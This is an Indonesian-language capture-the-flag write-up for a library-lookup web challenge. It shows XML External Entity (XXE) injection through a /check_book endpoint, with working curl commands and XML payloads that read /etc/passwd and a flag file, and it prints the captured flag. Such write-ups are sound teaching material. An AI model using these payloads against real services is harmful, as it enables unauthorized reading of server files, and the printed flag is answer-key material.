# Writeup - Библиотека Капибара-Сити

Challenge ini ternyata cukup lurus arahnya begitu halaman depan dibuka. Di UI ada form cek buku berdasarkan ID, dan JavaScript di halaman itu membentuk request XML mentah ke endpoint `/check_book`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<book>
    <id>1</id>
</book>
```

Itu langsung bikin saya curiga ke parser XML di backend, terutama karena deskripsi challenge juga bilang ada petunjuk yang disembunyikan "di server sendiri" dan "di file yang terlupakan". Kombinasi hint seperti itu sangat sering mengarah ke file disclosure lewat XXE.

## Enumerasi Awal

Request normal ke endpoint:

```bash
curl -i http://31.129.105.124/check_book \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><book><id>1</id></book>'
```

Server membalas dengan hasil pencarian buku yang valid. Jadi endpoint memang memproses XML input dari user.

Lalu saya tes XXE sederhana dengan membaca `/etc/passwd`:

```bash
curl http://31.129.105.124/check_book \
  -H 'Content-Type: application/xml' \
  --data-binary $'<?xml version="1.0"?>\n<!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<book><id>&xxe;</id></book>'
```

Hasilnya berhasil keluar isi `/etc/passwd`. Berarti parser XML di backend mengizinkan external entity dan menaruh hasil expand entity itu langsung ke elemen `<id>`, lalu memantulkannya lagi ke response.

## Akar Masalah

Vulnerabilitas utamanya adalah **XML External Entity Injection (XXE)**.

Backend menerima XML dari user tanpa mematikan resolusi external entity. Dengan begitu kita bisa:

- mendefinisikan entity sendiri di bagian `DOCTYPE`
- mengarahkannya ke file lokal dengan `SYSTEM "file:///..."`
- memanggil entity itu di dalam tag `<id>`
- membiarkan backend membaca file lokal dan mengembalikan isinya ke response

## Eksploitasi

Setelah XXE terkonfirmasi, target berikutnya adalah cari lokasi flag. Saya sempat cek beberapa path umum, dan file yang benar ternyata ada di:

```text
/app/flag.txt
```

Payload final:

```xml
<?xml version="1.0"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<book>
  <id>&xxe;</id>
</book>
```

Request:

```bash
curl http://31.129.105.124/check_book \
  -H 'Content-Type: application/xml' \
  --data-binary $'<?xml version="1.0"?>\n<!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>\n<book><id>&xxe;</id></book>'
```

Response:

```text
Результат поиска: capyCTF{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}
```

## Flag

```text
capyCTF{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}
```

## Solver

Saya buat solver di file [solve.py](/home/nata/ctf/kubsuctf/web/БиблиотекаКапибара-Сити/solve.py).

Contoh pakai:

```bash
source /home/nata/ctf_env/bin/activate
python solve.py
```

Kalau mau ganti target atau file yang dibaca:

```bash
python solve.py http://155.212.135.246 /app/flag.txt
```

## Catatan

Kalau challenge seperti ini muncul lagi, pattern yang patut dicurigai adalah:

- frontend mengirim XML langsung dari input user
- backend mengembalikan hasil parse ke response
- ada hint soal file lokal, config, notes, secret, atau petunjuk "di server"

Begitu tiga hal itu ketemu, XXE hampir selalu layak jadi hipotesis pertama.
